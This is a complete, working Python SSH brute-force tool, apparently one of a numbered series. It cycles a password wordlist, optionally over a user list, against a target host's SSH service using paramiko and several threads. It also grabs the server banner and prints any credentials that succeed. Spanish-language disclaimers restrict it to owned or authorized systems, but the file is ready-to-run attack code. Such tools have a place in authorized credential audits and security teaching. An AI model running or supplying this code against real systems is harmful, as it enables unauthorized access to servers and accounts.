#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════╗
║  03 · SSH BRUTE FORCER               ║
║  Credential testing via paramiko     ║
╚══════════════════════════════════════╝
SOLO USO EDUCATIVO / AUTORIZADO.
Usage: python3 03_ssh_brute.py -t 192.168.1.1 -u root -w passwords.txt
"""

import paramiko, argparse, socket, sys, time, threading, queue
from datetime import datetime
from colorama import Fore, Style, init
init(autoreset=True)
paramiko.util.log_to_file("/dev/null")

BANNER = f"""
{Fore.RED}╔══════════════════════════════════════╗
║  🔑 SSH BRUTE FORCER  v1.0           ║
║  Credential audit — authorized only  ║
╚══════════════════════════════════════╝{Style.RESET_ALL}
"""

found_creds = []
stop_event  = threading.Event()
lock        = threading.Lock()
counter     = {"tried": 0}

def try_ssh(host: str, port: int, username: str, password: str, timeout: float) -> bool:
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(host, port=port, username=username, password=password,
                       timeout=timeout, banner_timeout=timeout,
                       auth_timeout=timeout, look_for_keys=False,
                       allow_agent=False)
        client.close()
        return True
    except paramiko.AuthenticationException:
        return False
    except (paramiko.SSHException, socket.error, EOFError):
        time.sleep(0.5)
        return False
    except Exception:
        return False
    finally:
        try: client.close()
        except: pass

def worker(host: str, port: int, username: str,
           pw_queue: queue.Queue, timeout: float, delay: float):
    while not stop_event.is_set():
        try:
            password = pw_queue.get(timeout=1)
        except queue.Empty:
            break
        with lock:
            counter["tried"] += 1
            tried = counter["tried"]
        sys.stdout.write(f"\r  {Fore.GRAY}[{tried}] Probando: {username}:{password:<25}{Style.RESET_ALL}")
        sys.stdout.flush()
        if try_ssh(host, port, username, password, timeout):
            with lock:
                found_creds.append((username, password))
            print(f"\n\n  {Fore.GREEN}╔══════════════════════════════╗")
            print(f"  ║ ✓  CREDENCIAL ENCONTRADA!   ║")
            print(f"  ║    User: {username:<20}║")
            print(f"  ║    Pass: {password:<20}║")
            print(f"  ╚══════════════════════════════╝{Style.RESET_ALL}")
            stop_event.set()
        pw_queue.task_done()
        if delay > 0:
            time.sleep(delay)

def check_ssh_available(host: str, port: int, timeout: float = 5) -> bool:
    try:
        with socket.create_connection((host, port), timeout=timeout):
            return True
    except: return False

def get_ssh_banner(host: str, port: int) -> str:
    try:
        t = paramiko.Transport((host, port))
        t.start_client(timeout=5)
        banner = t.remote_version
        t.close()
        return banner
    except: return "?"

def main():
    print(BANNER)
    print(f"{Fore.RED}⚠  SOLO USAR EN SISTEMAS PROPIOS O CON AUTORIZACIÓN ESCRITA.{Style.RESET_ALL}\n")

    parser = argparse.ArgumentParser(description="SSH Brute Forcer")
    parser.add_argument("-t","--target",   required=True)
    parser.add_argument("-p","--port",     type=int, default=22)
    parser.add_argument("-u","--user",     default=None, help="Usuario único")
    parser.add_argument("-U","--userlist", default=None, help="Lista de usuarios")
    parser.add_argument("-w","--wordlist", required=True)
    parser.add_argument("--threads",       type=int, default=4)
    parser.add_argument("--timeout",       type=float, default=5.0)
    parser.add_argument("--delay",         type=float, default=0.2)
    parser.add_argument("--stop-on-found", action="store_true", default=True)
    args = parser.parse_args()

    # Usuarios
    if args.userlist:
        with open(args.userlist) as f:
            users = [l.strip() for l in f if l.strip()]
    elif args.user:
        users = [args.user]
    else:
        print(f"{Fore.RED}[✗] Especifica -u usuario o -U lista"); sys.exit(1)

    # Contraseñas
    try:
        with open(args.wordlist) as f:
            passwords = [l.strip() for l in f if l.strip()]
    except FileNotFoundError:
        print(f"{Fore.RED}[✗] Wordlist no encontrada: {args.wordlist}"); sys.exit(1)

    # Verificar disponibilidad
    print(f"{Fore.CYAN}[*] Verificando SSH en {args.target}:{args.port}...")
    if not check_ssh_available(args.target, args.port):
        print(f"{Fore.RED}[✗] SSH no disponible en {args.target}:{args.port}")
        sys.exit(1)

    banner = get_ssh_banner(args.target, args.port)
    print(f"{Fore.CYAN}[*] Banner : {banner}")
    print(f"{Fore.CYAN}[*] Usuarios: {len(users)}  Contraseñas: {len(passwords)}")
    print(f"{Fore.CYAN}[*] Threads : {args.threads}  Delay: {args.delay}s")
    print(f"{Fore.GRAY}{'─'*44}\n")
    print(f"{Fore.CYAN}[*] Iniciando... (Ctrl+C para detener)\n")

    start = datetime.now()

    for username in users:
        if stop_event.is_set():
            break
        stop_event.clear()
        pw_queue = queue.Queue()
        for pw in passwords:
            pw_queue.put(pw)

        threads = []
        for _ in range(min(args.threads, len(passwords))):
            t = threading.Thread(
                target=worker,
                args=(args.target, args.port, username, pw_queue, args.timeout, args.delay),
                daemon=True
            )
            t.start()
            threads.append(t)

        try:
            pw_queue.join()
        except KeyboardInterrupt:
            stop_event.set()
            print(f"\n{Fore.YELLOW}[!] Detenido por usuario")
            break

        for t in threads:
            t.join(timeout=2)

    elapsed = (datetime.now() - start).total_seconds()
    print(f"\n\n{Fore.GRAY}{'─'*44}")
    print(f"{Fore.CYAN}[*] Intentos  : {counter['tried']:,}")
    print(f"{Fore.CYAN}[*] Tiempo    : {elapsed:.1f}s")
    if found_creds:
        print(f"\n{Fore.GREEN}[✓] Credenciales válidas encontradas:")
        for u, p in found_creds:
            print(f"    {Fore.YELLOW}{u}:{p}{Style.RESET_ALL}")
    else:
        print(f"{Fore.YELLOW}[!] Sin credenciales válidas en el wordlist")

if __name__ == "__main__":
    main()
